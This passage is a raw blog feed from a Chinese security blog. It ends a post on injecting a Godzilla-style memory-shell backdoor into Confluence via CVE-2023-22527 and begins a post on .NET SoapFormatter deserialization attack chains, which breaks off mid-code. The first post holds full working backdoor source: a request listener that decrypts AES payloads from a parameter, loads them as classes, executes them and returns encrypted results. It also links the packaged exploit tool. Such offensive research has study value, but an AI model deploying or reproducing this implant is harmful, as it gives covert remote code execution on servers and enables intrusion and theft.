class="string">&quot;com.atlassian.confluence.compat.struts2.servletactioncontext.ServletActionContextCompatManager&quot;</span>).newInstance();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getRequest</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.atlassian.confluence.compat.struts2.servletactioncontext.ServletActionContextCompatManager&quot;</span>).getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getRequest.invoke(servletActionContextCompatManager, <span class="literal">null</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">servletContext</span> <span class="operator">=</span> invokeMethod(request, <span class="string">&quot;getServletContext&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> getFieldValue(getFieldValue(servletContext,<span class="string">&quot;context&quot;</span>), <span class="string">&quot;context&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">addListener</span><span class="params">(Object listener,Object standardContext)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">addApplicationEventListenerMethod</span> <span class="operator">=</span> standardContext.getClass().getDeclaredMethod(<span class="string">&quot;addApplicationEventListener&quot;</span>,Object.class);</span><br><span class="line">        addApplicationEventListenerMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        addApplicationEventListenerMethod.invoke(standardContext,listener);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;requestInitialized&quot;</span>))&#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">servletRequestEvent</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">            backDoor(servletRequestEvent);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">invokeMethod</span><span class="params">(Object obj,String methodName,Object... parameters)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ArrayList</span> <span class="variable">classes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">            <span class="keyword">if</span> (parameters!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;parameters.length;i++)&#123;</span><br><span class="line">                    Object o1=parameters[i];</span><br><span class="line">                    <span class="keyword">if</span> (o1!=<span class="literal">null</span>)&#123;</span><br><span class="line">                        classes.add(o1.getClass());</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        classes.add(<span class="literal">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> method.invoke(obj, parameters);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"><span class="comment">//        e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> Method <span class="title function_">getMethodByClass</span><span class="params">(Class cs,String methodName,Class... parameters)</span>&#123;</span><br><span class="line">        Method method=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (cs!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method=cs.getMethod(methodName, parameters);</span><br><span class="line">                cs=<span class="literal">null</span>;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                cs=cs.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field f=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Field)&#123;</span><br><span class="line">            f=(Field)obj;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            Method method=<span class="literal">null</span>;</span><br><span class="line">            Class cs=obj.getClass();</span><br><span class="line">            <span class="keyword">while</span> (cs!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    f=cs.getDeclaredField(fieldName);</span><br><span class="line">                    cs=<span class="literal">null</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    cs=cs.getSuperclass();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getParameter</span><span class="params">(Object requestObject,String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (String) invokeMethod(requestObject, <span class="string">&quot;getParameter&quot;</span>, name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getContentType</span><span class="params">(Object requestObject)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (String) invokeMethod(requestObject, <span class="string">&quot;getContentType&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] aes(<span class="type">byte</span>[] s,<span class="type">boolean</span> m)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(),<span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;<span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="keyword">try</span> &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);m.update(s.getBytes(), <span class="number">0</span>, s.length());ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;<span class="keyword">return</span> ret; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backDoor</span><span class="params">(Object servletRequestEvent)</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> invokeMethod(servletRequestEvent,<span class="string">&quot;getServletRequest&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">responseforvalidate</span> <span class="operator">=</span> getFieldValue(getFieldValue(request, <span class="string">&quot;request&quot;</span>), <span class="string">&quot;response&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.invokeMethod(responseforvalidate,<span class="string">&quot;setHeader&quot;</span>,<span class="string">&quot;X-Cmd-Result&quot;</span>,<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">contentType</span> <span class="operator">=</span> getContentType(request);</span><br><span class="line">                    <span class="keyword">if</span> (contentType!=<span class="literal">null</span> &amp;&amp; contentType.contains(<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> getParameter(request,password);</span><br><span class="line">                        <span class="keyword">if</span> (value!=<span class="literal">null</span>)&#123;</span><br><span class="line">                            <span class="type">byte</span>[] data = Base64.getDecoder().decode(value);</span><br><span class="line">                            data = aes(data, <span class="literal">false</span>);</span><br><span class="line">                            <span class="keyword">if</span> (data != <span class="literal">null</span> &amp;&amp; data.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                                <span class="keyword">if</span> (payloadClass == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    payloadClass =  <span class="keyword">new</span> <span class="title class_">ConfluenceFilterMemshell</span>(request.getClass().getClassLoader()).defineClass(data,<span class="number">0</span>,data.length);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">                                    <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> payloadClass.newInstance();</span><br><span class="line">                                    f.equals(arrOut);</span><br><span class="line">                                    f.equals(request);</span><br><span class="line">                                    f.equals(data);</span><br><span class="line">                                    f.toString();</span><br><span class="line"></span><br><span class="line">                                    <span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> md5(password + key);</span><br><span class="line">                                    <span class="keyword">if</span> (arrOut.size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                                        <span class="type">Object</span> <span class="variable">response</span> <span class="operator">=</span>  getFieldValue(getFieldValue(request,<span class="string">&quot;request&quot;</span>),<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                                        <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> (PrintWriter) invokeMethod(response,<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">                                        printWriter.write(md5.substring(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">                                        printWriter.write(Base64.getEncoder().encodeToString(aes(arrOut.toByteArray(), <span class="literal">true</span>)));</span><br><span class="line">                                        printWriter.write(md5.substring(<span class="number">16</span>));</span><br><span class="line">                                        printWriter.flush();</span><br><span class="line">                                        printWriter.close();</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们获取Context的类需要改为<code>com.atlassian.confluence.compat.struts2.servletactioncontext.ServletActionContextCompatManager</code><br>最后即可成功注入内存马<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674727825-ea68b0d7-3583-4f91-afc5-d13d95fb86d0.png#averageHue=%232e3238&clientId=u9363bb59-db00-4&from=paste&height=628&id=u09843151&originHeight=785&originWidth=1791&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=221735&status=done&style=none&taskId=u4b03b03c-84c8-4fe0-9193-f24a895a408&title=&width=1432.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674737268-aabf2ea3-9c8a-4880-8d07-0c19fa701ddb.png#averageHue=%232b2d37&clientId=u9363bb59-db00-4&from=paste&height=170&id=ue679e982&originHeight=213&originWidth=1206&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=142770&status=done&style=none&taskId=u6592bfa5-1e00-45df-9bce-587efc042ac&title=&width=964.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1707674747236-6741de8c-dc10-4c07-8643-1373b998be13.png#averageHue=%23f0f0ef&clientId=u9363bb59-db00-4&from=paste&height=520&id=ub118c935&originHeight=650&originWidth=611&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34105&status=done&style=none&taskId=u5342363e-2f8f-4b70-a3fe-75a3fb7ac03&title=&width=488.8" alt="image.png"></p><h1 id="工具制作"><a href="#工具制作" class="headerlink" title="工具制作"></a>工具制作</h1><p>工具参考北辰师傅的<code>[CVE-2022-26134-Godzilla-MEMSHELL](https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL)</code>，做了些简单的改写。<br>已经在Github上传<br><a href="https://github.com/Boogipop/CVE-2023-22527-Godzilla-MEMSHELL">https://github.com/Boogipop/CVE-2023-22527-Godzilla-MEMSHELL</a><br>师傅要是觉得不错的话可以给个Star支持一下呀</p>]]></content>
    
    
    <summary type="html">妈的</summary>
    
    
    
    <category term="At Dawn" scheme="http://boogipop.com/categories/At-Dawn/"/>
    
    
    <category term="Java" scheme="http://boogipop.com/tags/Java/"/>
    
    <category term="CVE" scheme="http://boogipop.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>【.NET 安全】ASP.NET SoapFormatter Deserialization 04</title>
    <link href="http://boogipop.com/2024/02/26/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20SoapFormatter%20Deserialization%2004/"/>
    <id>http://boogipop.com/2024/02/26/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20SoapFormatter%20Deserialization%2004/</id>
    <published>2024-02-26T12:29:42.000Z</published>
    <updated>2024-02-26T12:29:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0-0-参考"><a href="#0-0-参考" class="headerlink" title="0-0 参考"></a>0-0 参考</h1><p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/SoapFormatter.md">https://github.com/Y4er/dotnet-deserialization/blob/main/SoapFormatter.md</a></p><h1 id="0-1-ASP-NET-任意类加载"><a href="#0-1-ASP-NET-任意类加载" class="headerlink" title="0-1 ASP.NET 任意类加载"></a>0-1 ASP.NET 任意类加载</h1><p>作为和Java高度相似的一门语言，涉及到类，那就肯定涉及到类加载的问题，而DOTNET里的类加载其实也是一样的。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DonNET_Deserialization</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TEST</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> assembly = Assembly.Load(File.ReadAllBytes(<span class="string">&quot;ExpClassa.dll&quot;</span>));</span><br><span class="line">        <span class="keyword">var</span> types = assembly.GetTypes();</span><br><span class="line">        Activator.CreateInstance(types[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>csharp里类编译后会变成dll文件，那么我们同样的也可以读取dll文件的字节流，通过Assembly.Load方法去加载，获取到的是一个assembly对象，通过gettypes获取dll内所有的类型，这里当然只有一个类型，然后通过<code>Activator.CreateInstance</code>实例化对象触发恶意方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708750017477-aa332d5a-0947-4a4c-a8f3-cf0775bad88a.png#averageHue=%23323030&clientId=uf24e7de4-7362-4&from=paste&height=414&id=u0b0b51c6&originHeight=518&originWidth=1220&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=86920&status=done&style=none&taskId=uca8e800d-9348-45eb-8d36-eb1605fee71&title=&width=976" alt="image.png"><br>至此我们可以知道，Csharp里的链子形式其实都是类似的。</p><h1 id="0-2-SoapFormatter"><a href="#0-2-SoapFormatter" class="headerlink" title="0-2 SoapFormatter"></a>0-2 SoapFormatter</h1><p>这东西其实不是今天的重点，因为他只是个序列化的模式，这一节讲的其实是其他几个链子。这里简单介绍一下他的模式。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SoapDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> age;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span> =&gt; age; <span class="keyword">set</span> =&gt; age = <span class="keyword">value</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span> =&gt; name; <span class="keyword">set</span> =&gt; name = <span class="keyword">value</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SayHello</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;hello from SayHello&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            SoapFormatter soapFormatter = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.Age = <span class="number">10</span>;</span><br><span class="line">            person.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream stream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                soapFormatter.Serialize(stream,person);</span><br><span class="line"></span><br><span class="line">                <span class="built_in">string</span> soap = Encoding.UTF8.GetString(stream.ToArray());</span><br><span class="line">                Console.WriteLine(soap);</span><br><span class="line"></span><br><span class="line">                stream.Position = <span class="number">0</span>;</span><br><span class="line">                Person p = (Person)soapFormatter.Deserialize(stream);</span><br><span class="line">                Console.WriteLine(p.Name);</span><br><span class="line">                p.SayHello();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它和BinaryFormatter其实一样，可以选择代理器，所以思路也几乎一样。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:SOAP-ENC</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="attr">xm</span></span></span><br><span class="line"><span class="tag"><span class="attr">lns:SOAP-ENV</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:clr</span>=<span class="string">&quot;http://schemas.microsoft.com/soap/encoding/clr/1.0&quot;</span> <span class="attr">SOAP-ENV:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/enc</span></span></span><br><span class="line"><span class="string"><span class="tag">oding/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a1:Person</span> <span class="attr">id</span>=<span class="string">&quot;ref-1&quot;</span> <span class="attr">xmlns:a1</span>=<span class="string">&quot;http://schemas.microsoft.com/clr/nsassem/SoapDeserialization/DonNET%20Deserialization%2C%20Version%3D1.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyT</span></span></span><br><span class="line"><span class="string"><span class="tag">oken%3Dnull&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">age</span>&gt;</span>10<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span> <span class="attr">id</span>=<span class="string">&quot;ref-3&quot;</span>&gt;</span>jack<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a1:Person</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SOAP-ENV:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SOAP-ENV:Envelope</span>&gt;</span></span><br><span class="line"></span><br><span class="line">jack</span><br><span class="line">hello from SayHello</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果如上，输出的格式又和XmlSerializer一样。</p><h1 id="0-3-ActivitySurrogateSelector-攻击链"><a href="#0-3-ActivitySurrogateSelector-攻击链" class="headerlink" title="0-3 ActivitySurrogateSelector 攻击链"></a>0-3 ActivitySurrogateSelector 攻击链</h1><p>这一部分其实和Hessian反序列化很相似。在第一篇文章中，带大家了解了代理器的用法，代理器可以让一个不可序列化的类进行序列化，就和下面的Demo一样，但是你会意识到一个问题，就是他无法反序列化。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SoapDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Person</span>(<span class="params"><span class="built_in">string</span> name</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">ToString</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">PersonSerializeSurrogate</span> : <span class="title">ISerializationSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">Object obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> p = (Person)obj;</span><br><span class="line">            info.AddValue(<span class="string">&quot;Name&quot;</span>, p.Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">SetObjectData</span>(<span class="params">Object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> p = (Person)obj;</span><br><span class="line">            p.Name = info.GetString(<span class="string">&quot;Name&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(<span class="string">&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">            SoapFormatter fmt = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">            MemoryStream stm = <span class="keyword">new</span> MemoryStream();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> ss = <span class="keyword">new</span> SurrogateSelector();</span><br><span class="line">            ss.AddSurrogate(<span class="keyword">typeof</span>(Person), <span class="keyword">new</span> StreamingContext(StreamingContextStates.All), <span class="keyword">new</span> PersonSerializeSurrogate());</span><br><span class="line">            fmt.SurrogateSelector = ss;</span><br><span class="line">            fmt.Serialize(stm, <span class="keyword">new</span> Person(<span class="string">&quot;jack&quot;</span>));</span><br><span class="line">            stm.Position = <span class="number">0</span>;</span><br><span class="line">            Console.WriteLine(fmt.Deserialize(stm));</span><br><span class="line"></span><br><span class="line">            stm.Position = <span class="number">0</span>;</span><br><span 